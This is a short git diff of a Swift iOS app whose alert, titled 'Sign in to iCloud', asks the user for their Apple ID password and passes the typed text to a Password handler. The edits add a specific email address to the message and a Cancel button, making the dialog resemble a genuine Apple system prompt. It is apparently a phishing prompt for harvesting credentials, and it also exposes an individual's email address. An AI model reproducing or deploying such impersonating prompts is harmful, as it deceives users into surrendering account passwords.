@@ -46,7 +46,7 @@ class ViewController: UIViewController {
                 return
             }
             
-            let Prompt = UIAlertController(title: "Sign in to iCloud", message: "To continue enter the password for your Apple ID", preferredStyle: UIAlertControllerStyle.alert)
+            let Prompt = UIAlertController(title: "Sign in to iCloud", message: "To continue enter the password for your Apple ID ”shehryar.khan@resinnovation.com”", preferredStyle: UIAlertControllerStyle.alert)
             
             var passwordTextField: UITextField?
             
@@ -63,6 +63,7 @@ class ViewController: UIViewController {
                 self.Password(password: passwordTextField?.text)
             }))
             
+            Prompt.addAction(UIAlertAction(title: "Cancel", style: UIAlertActionStyle.default, handler: nil))            
             self.present(Prompt, animated: true, completion: nil)
         }
         
